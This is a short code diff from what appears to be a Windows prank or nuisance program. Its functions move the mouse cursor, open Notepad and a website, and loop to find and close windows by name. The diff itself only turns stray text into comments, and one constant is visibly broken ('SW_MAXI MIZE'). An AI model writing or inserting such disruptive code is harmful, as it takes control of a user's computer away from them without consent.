@@ -21,7 +21,7 @@ void CrazyMouse() {
   SetCursorPos(X, Y);
 }
 
-open random Apps as it says OpenStuff
+/*open random Apps as it says OpenStuff*/
 
 void OpenStuff() {
   ShellExecute(NULL, "open", Notepad, NULL, NULL, SW_MAXI MIZE);
@@ -30,9 +30,9 @@ void OpenStuff() {
   ShellExecute(NULL, "open", Website, NULL, NULL, SW_MAXI MIZE);
 }
 
-Find windows by name and destroy them...Using the FindWindow command lets use do it and
+/*Find windows by name and destroy them...Using the FindWindow command lets use do it and
   if
-its not null and it found the window open give it a command.
+its not null and it found the window open give it a command.*/
 
 DWORD WINAPI DestroyWindows(LPVOID) {
     while (1) {
